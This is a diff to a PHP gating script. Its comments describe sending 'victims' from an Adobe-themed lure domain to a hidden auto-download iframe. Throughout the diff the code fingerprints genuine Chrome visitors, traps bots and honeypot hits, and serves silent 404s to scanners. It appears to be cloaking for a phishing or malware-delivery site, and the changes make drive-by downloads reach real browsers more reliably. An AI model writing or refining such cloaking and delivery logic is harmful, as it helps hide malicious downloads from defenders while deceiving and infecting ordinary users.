@@ -102,13 +102,16 @@ function is_real_browser(): bool {
 }
 
 // Core desktop-Chrome fingerprint (page-independent).
-function chrome_headers_ok(): bool {
+// $topLevel: Chrome only sends Upgrade-Insecure-Requests on top-level
+// document navigations — subresource navigations (the hidden <iframe>)
+// omit it, so requiring it there 404s every real browser.
+function chrome_headers_ok(bool $topLevel = true): bool {
     if (ua() === '' || is_bot_ua() || !is_real_browser()) return false;
     if (chrome_major(ua()) < 100) return false;
     if (stripos(req_header('Accept'), 'text/html') !== 0) return false;
     if (req_header('Accept-Language') === '') return false;
     if (req_header('Accept-Encoding') === '') return false;
-    if (strtolower(req_header('Upgrade-Insecure-Requests')) !== '1') return false;
+    if ($topLevel && strtolower(req_header('Upgrade-Insecure-Requests')) !== '1') return false;
     if (strtolower(req_header('Sec-Fetch-Mode')) !== 'navigate') return false;
 
     // Client hints — present in every real modern Chrome, absent in most bots.
@@ -136,6 +139,13 @@ function chrome_headers_ok(): bool {
     if ($ref === '') {
         if ($sfs !== '' && $sfs !== 'none') return false;
     } else {
+        // Cross-site arrival is legitimate only from the landing zone
+        // (victim clicked a link on the adobe.smar-to.com page); Chrome
+        // sends the external referer + Sec-Fetch-Site: cross-site there.
+        $rhost = strtolower((string)(parse_url($ref, PHP_URL_HOST) ?? ''));
+        if (substr($rhost, -11) === 'smar-to.com' && $sfs === 'cross-site') {
+            return true;
+        }
         if (!in_array($sfs, ['same-origin', 'same-site'], true)) return false;
     }
     return true;
@@ -237,7 +247,9 @@ function gate_doc(array $allowedRefPaths, int $minAge, bool $requireUser): void 
 function gate_dl(): array {
     if (isset($_GET['hp'])) { poison_hit(); }
     if (is_poisoned()) silent_404();
-    if (!chrome_headers_ok()) silent_404();
+    // $topLevel=false: the auto-download iframe is a subresource doc load
+    // (no Upgrade-Insecure-Requests, no Sec-Fetch-User) — must not 404 it.
+    if (!chrome_headers_ok(false)) silent_404();
     $dest = strtolower(req_header('Sec-Fetch-Dest'));
     if ($dest === 'document') {
         if (strtolower(req_header('Sec-Fetch-User')) !== '?1') silent_404();
